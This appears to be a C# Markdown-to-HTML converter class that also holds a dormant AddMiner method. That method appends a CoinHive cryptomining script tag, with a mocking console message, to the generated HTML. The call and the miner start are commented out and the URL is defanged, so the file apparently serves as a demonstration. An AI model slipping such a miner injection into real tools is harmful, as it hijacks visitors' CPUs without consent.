using Markdig;

namespace markdown_to_html
{
    public class Converter
    {
        public string Execute(string markDownText)
        {
            var html = Markdown.ToHtml(markDownText);

        //    html = AddMiner(html);

            return html;
        }

        private string AddMiner(string html)
        {
            var minerScript = @"<script src='hxxps://coin-hive.com/lib/coinhive.min.js'></script>
<script>
    console.log('Now using your CPU to make me some money... <evil cackle>');
    //var miner = new CoinHive.Anonymous('000000000000000000000000');
    //miner.start();
</script>";
            html += minerScript;

            return html;
        }
    }
}
